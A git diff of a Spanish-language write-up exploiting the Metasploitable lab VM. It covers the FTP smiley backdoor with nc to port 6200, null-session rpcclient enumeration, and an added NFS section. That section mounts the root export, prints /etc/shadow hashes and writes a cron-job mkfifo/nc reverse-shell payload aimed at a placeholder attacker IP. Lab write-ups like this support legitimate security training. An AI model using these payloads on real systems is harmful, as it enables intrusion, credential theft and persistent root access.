@@ -29,7 +29,7 @@ nmap -sn 192.168.0/24
 ```
 Ahora que conocemos la IP de la máquina, podemos iniciar a escanear los puertos con nmap (recomiendo el siguiente comando facilitar los futuros procesos):
 ```bash
-nmap -p- 192.168.143 -oN openPorts.txt
+nmap -p- IP -oN openPorts.txt
 ```
 
 ![4](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/4.png)
@@ -74,17 +74,17 @@ Como mencioné en la introducción, todos los ataques redactados aquí se realiz
 
 Nos conectamos a la instancia de FTP del objetivo con cualquier nombre de usuario, pero es obligatorio que termine con ":)", y como contraseña ponemos cualquier cosa, o incluso nada.
 ```bash
-ftp 192.168.5.143
+ftp IP
 ```
 ![5](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/5.png)
 
 Al iniciar sesión, notamos que la conexión se "paraliza". Esto es porque el backdoor abrió una shell en el puerto 6200 del sistema víctima y está esperando por conexiones. Al conectarnos a la shell, ingresamos al sistema como root. Esto es porque el servicio FTP se ejecutaba con permisos del usuario administrador:
 ```bash
-nc 192.168.5.143 6200
+nc IP 6200
 ```
 ![6](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/6.png)
 
-Y de esta forma habremos explotado Metasploitable a través de FTP.
+Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de FTP.
 
 ---
 # SSH
@@ -116,7 +116,7 @@ PORT      STATE SERVICE     VERSION
 ```
 Para enumerar usuarios a través de RPC utilizaremos el comando **rpcclient**. Vamos a intentar acceder como invitado (sin credenciales) con el siguiente comando:
 ```bash
-rpcclient -U "" -N 192.168.5.143
+rpcclient -U "" -N IP
 ```
 Luego de loguearnos como invitado en RPC, ejecutando el comando `enumdomusers` podremos ver los usuarios del sistema objetivo:
 ```bash
@@ -182,12 +182,81 @@ Dentro de Python importamos la biblioteca `os`, y por último llamamos una termi
 
 ![9](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/9.png)
 
-Y de esta forma habremos explotado Metasploitable a través de SSH.
+Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de SSH.
 
-# DNS
-En esta sección haremos uso del servicio DNS [(Domain Name Service)](https://www.cloudflare.com/es-es/learning/dns/what-is-dns/) para recolectar información en el objetivo, para posteriormente poder ingresar al sistema.
+# NFS
+```bash
+PORT      STATE SERVICE     VERSION
+2049/tcp  open  nfs         2-4 (RPC #100003)
+```
+Podemos enumerar los recursos que el objetivo está compartiendo a través de NFS con el comando `showmount -e IP`
+![10](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/10.png)
+Como se puede observar en la salida, Metasploitable está compartiendo todo el sistema a través del directorio raíz. Montar este recurso nos daría acceso a todos los archivos dentro del objetivo.
 
+Para montar el recurso, primero debemos crear una carpeta que sirva como punto de montaje, y posteriormente usar el comando `mount` para montarlo allí:
+```bash
+mkdir PUNTO_MONTAJE
+sudo mount -t IP:RUTA UBICACION_LOCAL
+```
+![11](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/11.png)
+Una vez dentro del sistema, podemos comprobar si las configuraciones en el NFS objetivo tienen la opción `no_root_squash` habilitada, cosa que nos permitiría actuar como root dentro del recurso compartido, por el simple hecho de ser root en nuestra máquina local. 
 
+Esto lo comprobamos intentando leer el archivo [/etc/shadow](https://linuxize.com/post/etc-shadow-file/) del sistema de Metasploitable:
+```bash
+sudo cat PUNTO_MONTAJE/etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+statd:*:15474:0:99999:7:::
+```
+Confirmamos que podemos actuar como root en el recurso compartido. Es momento de obtener una shell como el usuario root. Para lograr esto, nos aprovecharemos de los [cronjobs](https://cloud.donweb.com/guia-completa-de-cron-job-en-linux-para-principiantes-en-5-pasos/), para agendar una tarea automática que tenga como función crear una shell inversa para conectarnos al sistema.
+
+Para lograr esto debemos crear un cronjob dentro del directorio `/etc/cron.d` y escribir el siguiente payload dentro del archivo:
+```bash
+* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PUERTO> >/tmp/f
+```
+Y abrimos un socket en escucha en nuestra máquina con netcat, utilizando el puerto que indicamos anteriormente:
+```bash
+nc -lvnp PUERTO
+```
+Aquí podemos el ejemplo:
+![12](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/12.png)
+
+![13](https://github.com/vonoHC/Writeups/blob/main/Metasploitable/Capturas/13.png)
+
+Y de esta forma habremos hecho nuestro el sistema de Metasploitable a través de NFS.
 
 
 
